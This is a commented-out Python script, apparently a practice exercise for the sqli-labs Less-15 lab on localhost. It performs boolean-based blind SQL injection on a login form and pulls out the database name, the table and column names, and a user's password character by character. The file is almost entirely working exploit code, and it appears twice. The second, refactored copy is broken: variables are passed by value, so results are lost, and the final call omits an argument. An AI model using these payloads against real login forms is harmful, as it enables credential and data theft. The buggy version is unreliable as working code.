#布尔盲注
# import requests


# url = "http://localhost/sqli-labs/Less-15/"

# database_length = 0
# database_name = ""
# table_name = ""
# column_name = ""
# flag = ""

# #Speculate the length of the database name

# for i in range(1, 100):
#     payload = f"1' or length(database())={i} #"
#     ultimate_payload = {"uname": payload, "passwd": "1"}
#     response = requests.post(url, data=ultimate_payload)
#     print(payload)
#     if "flag" in response.text:
#         database_length = i
#         break
# print(f"Ultimate flag length: {database_length}")


# #Speculate the database name
# for i in range(1, 100):
#     for ascii in range(32, 128):
#         payload = f"1' or ascii(substr(database(),{i},1))={ascii} #"
#         ultimate_payload = {"uname": payload, "passwd": "1"}
#         response = requests.post(url, data=ultimate_payload)
#         print(payload)
#         if "flag" in response.text:
#             database_name += chr(ascii)
#             print(f"Database name: {database_name}")
#             break
#     if ascii == 127:
#         print(f"Database name: {database_name}")
#         exit()

# #speculate the table name
# for i in range(1, 100):
#     for ascii in range(32, 128):
#         payload = f"1' or ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 3,1),{i},1))={ascii} #"
#         ultimate_payload = {"uname": payload, "passwd": "1"}
#         response = requests.post(url, data=ultimate_payload)
#         print(payload)
#         if "flag" in response.text:
#             table_name += chr(ascii)
#             print(f"table_name: {table_name}")
#             break
#     if ascii == 127:
#         print(f"table_name: {table_name}")
#         exit()

# #Speculate the column name
# for i in range(1, 100):
#     for ascii in range(32, 128):
#         payload = f"1' or ascii(substr((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 2,1),{i},1))={ascii} #"
#         ultimate_payload = {"uname": payload, "passwd": "1"}
#         response = requests.post(url, data=ultimate_payload)
#         print(payload)
#         if "flag" in response.text:
#             column_name += chr(ascii)
#             print(f"column_name: {column_name}")
#             break
#     if ascii == 127:
#         print(f"column_name: {column_name}")
#         exit()
        

# #Speculate the flag
# for i in range(1, 100):
#     for ascii in range(32, 128):
#         payload = f"1' or ascii(substr((select password from users limit 0,1),{i},1))={ascii} #"
#         ultimate_payload = {"uname": payload, "passwd": "1"}
#         response = requests.post(url, data=ultimate_payload)
#         print(payload)
#         if "flag" in response.text:
#             flag += chr(ascii)
#             print(f"flag: {flag}")
#             break
#     if ascii == 127:
#         print(f"flag: {flag}")
#         exit()

#main function
# if __name__ == '__main__':  

#     database_length = 0
#     database_name = ""
#     table_name = ""
#     column_name = ""
#     flag = ""
#     speculate_datebase_length(url,database_length)
#     speculate_database_name(url,database_name)
#     speculate_table_name(url,database_name,table_name)
#     speculate_column_name(url,database_name,table_name,column_name)
#     speculate_flag(url,table_name,column_name)





# #布尔盲注
# import requests


# url = "http://localhost/sqli-labs/Less-15/"


# #Speculate the length of the database name
# def speculate_datebase_length(url,database_length):
#     for i in range(1, 100):
#         payload = f"1' or length(database())={i} #"
#         ultimate_payload = {"uname": payload, "passwd": "1"}
#         response = requests.post(url, data=ultimate_payload)
#         print(payload)
#         if "flag" in response.text:
#             database_length = i
#             break
#     print(f"Ultimate flag length: {database_length}")

# #Speculate the database name
# def speculate_database_name(url,database_name):
#     for i in range(1, 100):
#         for ascii in range(32, 128):
#             payload = f"1' or ascii(substr(database(),{i},1))={ascii} #"
#             ultimate_payload = {"uname": payload, "passwd": "1"}
#             response = requests.post(url, data=ultimate_payload)
#             print(payload)
#             if "flag" in response.text:
#                 database_name += chr(ascii)
#                 print(f"Database name: {database_name}")
#                 break
#         if ascii == 127:
#             print(f"Database name: {database_name}")
#             return

# #speculate the table name
# def speculate_table_name(url,database_name,table_name):
#     for i in range(1, 100):
#         for ascii in range(32, 128):
#             payload = f"1' or ascii(substr((select table_name from information_schema.tables where table_schema='{database_name}' limit 3,1),{i},1))={ascii} #"
#             ultimate_payload = {"uname": payload, "passwd": "1"}
#             response = requests.post(url, data=ultimate_payload)
#             print(payload)
#             if "flag" in response.text:
#                 table_name += chr(ascii)
#                 print(f"table_name: {table_name}")
#                 break
#         if ascii == 127:
#             print(f"table_name: {table_name}")
#             return

# #Speculate the column name
# def speculate_column_name(url,database_name,table_name,column_name):
#     for i in range(1, 100):
#         for ascii in range(32, 128):
#             payload = f"1' or ascii(substr((select column_name from information_schema.columns where table_schema='{database_name}' and table_name='{table_name}' limit 2,1),{i},1))={ascii} #"
#             ultimate_payload = {"uname": payload, "passwd": "1"}
#             response = requests.post(url, data=ultimate_payload)
#             print(payload)
#             if "flag" in response.text:
#                 column_name += chr(ascii)
#                 print(f"column_name: {column_name}")
#                 break
#         if ascii == 127:
#             print(f"column_name: {column_name}")
#             return
        

# #Speculate the flag
# def speculate_flag(url,table_name,column_name,flag):
#     for i in range(1, 100):
#         for ascii in range(32, 128):
#             payload = f"1' or ascii(substr((select {column_name} from '{table_name}' limit 0,1),{i},1))={ascii} #"
#             ultimate_payload = {"uname": payload, "passwd": "1"}
#             response = requests.post(url, data=ultimate_payload)
#             print(payload)
#             if "flag" in response.text:
#                 flag += chr(ascii)
#                 print(f"flag: {flag}")
#                 break
#         if ascii == 127:
#             print(f"flag: {flag}")
#             return

# #main function
# if __name__ == '__main__':  

#     database_length = 0
#     database_name = ""
#     table_name = ""
#     column_name = ""
#     flag = ""
#     speculate_datebase_length(url,database_length)
#     speculate_database_name(url,database_name)
#     speculate_table_name(url,database_name,table_name)
#     speculate_column_name(url,database_name,table_name,column_name)
#     speculate_flag(url,table_name,column_name)
    